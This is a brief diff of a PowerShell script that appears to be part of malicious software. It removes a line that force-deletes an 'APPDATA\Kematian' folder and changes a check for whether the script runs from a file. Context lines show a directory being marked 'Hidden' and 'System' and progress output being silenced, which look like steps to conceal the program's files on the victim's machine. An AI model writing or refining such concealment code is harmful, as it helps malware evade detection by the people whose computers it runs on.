@@ -8,7 +8,7 @@ else {
     $ProgressPreference = 'SilentlyContinue'
 }
 
-if ($MyInvocation.PSCommandPath) {
+if (Test-Path $PSCommandPath) {
     $isFile = $true
 } else {
     $isFile = $false
@@ -53,7 +53,6 @@ function Invoke-TASKS {
         $KDOT_DIR.attributes = "Hidden", "System"
         Add-Normal
     } else {
-        Remove-Item -Path "$env:APPDATA\Kematian" -Recurse -Force
         if ($isFile) {
             Add-Normal
         }
